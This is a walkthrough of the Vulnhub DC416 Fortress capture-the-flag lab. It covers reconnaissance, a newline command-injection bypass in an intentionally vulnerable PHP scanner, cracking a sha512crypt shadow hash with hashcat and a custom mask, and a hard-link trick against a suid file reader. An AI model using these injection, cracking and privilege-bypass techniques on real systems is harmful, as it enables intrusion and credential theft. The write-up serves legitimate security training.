+++
Description = "Vulnhub - DC416: Fortress Writeup"
title = "Vulnhub - DC416: Fortress Writeup"
date = "2017-01-13T23:45:00+01:00"
metakeys = ["vulnhub", "walkthrough", "writeup", "DC416", "fortress"]
image = "/img/misc/vulnhub.png"
+++

[Fortress](https://www.vulnhub.com/entry/dc416-2016,168/) is the last of 4 DC416 VMs by [@superkojiman](https://twitter.com/superkojiman).

<!--more-->

Here are my other writeups for the DC416 challenges:

- [DC416 Basement](/post/vulnhub_dc416_basement/)
- [DC416 Baffle](/post/vulnhub_dc416_baffle/)
- [DC416 Dick Dastardly](/post/vulnhub_dc416_dick_dastardly/)

# information gathering

A nmap scan of the machine reveals a FreeBSD server with a webserver present.

```
root@kali:~# nmap -sS -p- -A 192.168.56.2
Nmap scan report for 192.168.56.2
Host is up (0.00064s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2 (FreeBSD 20160310; protocol 2.0)
| ssh-hostkey:
|   2048 3a:34:82:2b:86:e3:2a:e4:2c:34:18:85:f9:94:7c:69 (RSA)
|_  256 78:79:e2:ed:27:e3:43:77:0b:07:d2:03:bb:7f:c1:02 (ECDSA)
80/tcp  open  http     Apache httpd 2.4.23 ((FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27)
|_http-server-header: Apache/2.4.23 (FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27
|_http-title: Did not follow redirect to https://192.168.56.2/
443/tcp open  ssl/http Apache httpd 2.4.23 ((FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (FreeBSD) OpenSSL/1.0.2j-freebsd PHP/5.6.27
|_http-title: fortress
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=ON/countryName=CA
| Not valid before: 2016-11-05T05:05:36
|_Not valid after:  2017-11-05T05:05:36
|_ssl-date: TLS randomness does not represent time
```

The webserver contains the following rules

```
Engagement Rules:

No SSH bruteforcing is necessary
This box has 3 flags
Flags are in the FLAG{} format
The goal is not to get root. Get the flags and move on
Have fun
```

# flag1

We start by running `dirb` against the target to identify scripts and directories to attack. As we know from the `nmap` output the server is also running PHP so let's scan for files with a `.php` ending too.

```
root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Fri Jan 13 21:24:14 2017
URL_BASE: https://192.168.56.2/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
-----------------
GENERATED WORDS: 20458
---- Scanning URL: https://192.168.56.2/ ----
-----------------
END_TIME: Fri Jan 13 21:24:24 2017
DOWNLOADED: 20458 - FOUND: 0
```

```
root@kali:~# dirb https://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Fri Jan 13 21:24:29 2017
URL_BASE: https://192.168.56.2/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
-----------------
GENERATED WORDS: 20458
---- Scanning URL: https://192.168.56.2/ ----
+ https://192.168.56.2/scanner.php (CODE:200|SIZE:370)
-----------------
END_TIME: Fri Jan 13 21:24:40 2017
DOWNLOADED: 20458 - FOUND: 1
```

Awesome we found `scanner.php`. By looking at the file we can see a script to scan a target via nmap.

![Scanner](/img/vulnhub_dc416_fortress/scanner_scan.png)

By playing around with the input we can completely modify the command like adding new parameters to `nmap` but some special characters are filtered to prevent command injection. I identified the newline character as a not filtered character which leads to full command execution as the user `www`.

![Injection](/img/vulnhub_dc416_fortress/scanner_inject.png)

We can now also view the source code of `scanner.php` to verify the filtering taking place:

`cat scanner.php`

```php
<html>
<head>
<title>S C A N N 3 R</title>
<link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body>

<div class="container">

<form method="POST" action="">
  <input class="form" type="text" name="host" value="127.0.0.1" />
  <input class="button" type="submit" value="Scan Target" />
</form>
<?php

if(isset($_POST['host'])) {
    $cmd = "/usr/local/bin/nmap -F -sT ".$_POST['host'];
    echo "<pre>Command: $cmd\n\n</pre>";

    if (strpos($cmd, ";") !== FALSE || strpos($cmd, "|") !== FALSE || strpos($cmd, "&") !== FALSE) {
        echo "<pre>Nope. Good try though... 💋</pre>\n";
    } else {
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
    }
}
?>

<img class="logo" src="logo.png">

</div>
</body>
</html>
</pre>
<img class="logo" src="logo.png">

</div>
</body>
</html>
```

Next we examine the other files present

```
total 144
drwxr-xr-x  4 root  wheel   512B Nov  9 20:24 .
drwxr-xr-x  6 root  wheel   512B Nov  9 19:58 ..
-rw-r--r--  1 root  wheel   561B Nov  8 23:51 index.html
drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 k1ngd0m_k3yz
-rw-r--r--  1 root  wheel    44K Nov  4 00:46 logo.png
drwxr-xr-x  2 root  wheel   512B Nov  9 20:22 s1kr3t
-rw-r--r--  1 root  wheel   759B Nov  5 00:50 scanner.php
-rw-r--r--  1 root  wheel   612B Nov  4 01:01 styles.css
```

The first flag can be found in the `s1kr3t` directory.

```
cat s1kr3t/flag.txt
FLAG{n0_one_br3aches_teh_f0rt}
```

# flag2

There is also another interesting directory named `k1ngd0m_k3yz`. The directory seems to contain a line extracted from `/etc/shadow` and the corresponding line from `/etc/passwd`.

```
cat k1ngd0m_k3yz/master
craven:$6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.:1002:1002::0:0:User &:/home/craven:/bin/sh

cat k1ngd0m_k3yz/passwd
craven:*:1002:1002:User &:/home/craven:/bin/sh
```

So we now have a hash for the user `craven`. If we look at raven's home directory under `/home/craven` we can see an unreadable `flag.txt`, `hint.txt` and `reminder.txt`.

The hint says:

```
Keep forgetting my password, so I made myself a hint. Password is three digits followed by my pet's name and a symbol.
```

And the reminder:

```
To buy:
* skim milk
* organic free-run eggs
* dog bone for qwerty
* sriracha
```

So it looks like `craven` owns a dog named `qwerty` and uses it as part of his password.

The next step is to create a custom wordlist using the pattern from the hint. We use [Hashcat Maskprocessor](https://github.com/hashcat/maskprocessor) for this purpose.

After building the source code we can generate all possible passwords by running the following command:

```
./mp64.bin ?d?d?dqwerty?s > pass.txt
```

`?d` stands for one digit and `?s` for a symbol. This command creates every possible word starting with 3 digits followed by the word qwery and a symbol.

Now we can use this wordlist to crack the hash using [hashcat](https://hashcat.net/hashcat/). The hash type is `1800` which is defined as `sha512crypt $6$, SHA512(Unix)` (we can identify this by looking at the starting `$6$` of the hash). The file `hash.txt` only contains the hash without the extra stuff from the `master` file.

```
[firefart@linux hashcat]$ ./hashcat -m 1800 hash.txt pass.txt
hashcat (v3.30-5-gdd57ef5) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1070, 2027/8110 MB allocatable, 15MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable Optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Watchdog: Temperature abort trigger set to 90c
Watchdog: Temperature retain trigger disabled

Cache-hit dictionary stats pass.txt: 363000 bytes, 33000 words, 33000 keyspace

The wordlist or mask you are using is too small.
Therefore, hashcat is unable to utilize the full parallelization power of your device(s).
The cracking speed will drop.
Workaround: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_to_create_more_work_for_full_speed

INFO: approaching final keyspace, workload adjusted

$6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.:931qwerty?

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt, SHA512(Unix)
Hash.Target......: $6$qAgPM2TEordSoFnH$4uPUAhB.9rORkWExA8jI0Sbwn0Bj50KAK0tJ4rkrUrIkP6v.gE/6Fw9/yn1Ejl2TedyN5ziUz8N0unsHocuks.
Time.Started.....: Fri Jan 13 22:25:28 2017 (0 secs)
Time.Estimated...: Fri Jan 13 22:25:28 2017 (0 secs)
Input.Base.......: File (pass.txt)
Input.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:    89162 H/s (2.20ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 33000/33000 (100.00%)
Rejected.........: 0/33000 (0.00%)
Restore.Point....: 0/33000 (0.00%)
Candidates.#1....: 000qwerty  -> 999qwerty~
HWMon.Dev.#1.....: Temp: 63c Fan: 38% Util:100% Core:1936Mhz Mem:3802Mhz Lanes:16

Started: Fri Jan 13 22:25:23 2017
Stopped: Fri Jan 13 22:25:29 2017
```

So we found cravens password: `931qwerty?`.

Now we can try to login as `craven` via SSH to see if the password is valid and get the next flag.

```
ssh craven@192.168.56.2
$ cat flag.txt
FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
```

# flag3

We can spot a suid binary from the user `vulnhub` in it's home directory `/home/vulnhub`.

```
$ cd /home/vulnhub/
$ ./reader
./reader [file to read]
$ ./reader flag.txt
Checking file type...
Checking if flag file...
Nope. Can't let you have the flag.
$ ./reader /etc/passwd
Checking file type...
Checking if flag file...
Great! Printing file contents...
Win, here's your flag:
# $FreeBSD: releng/11.0/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
```

It seems the binary checks the filename for `flag.txt` so let's try to trick this check with a symbolic link:

```
$ ln -s /home/vulnhub/flag.txt /tmp/test
$ ./reader /tmp/test
Checking file type...
Symbolic links not allowed!
```

Bummer, no symbolic links allowed. So let's try to use a hard link:

```
$ ln -f /home/vulnhub/flag.txt /tmp/test
$ ./reader /tmp/test
Checking file type...
Checking if flag file...
Great! Printing file contents...
Win, here's your flag:
FLAG{its_A_ph0t0_ph1ni5h}
```

Done!

# flags

```
FLAG{n0_one_br3aches_teh_f0rt}
FLAG{w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
FLAG{its_A_ph0t0_ph1ni5h}
```
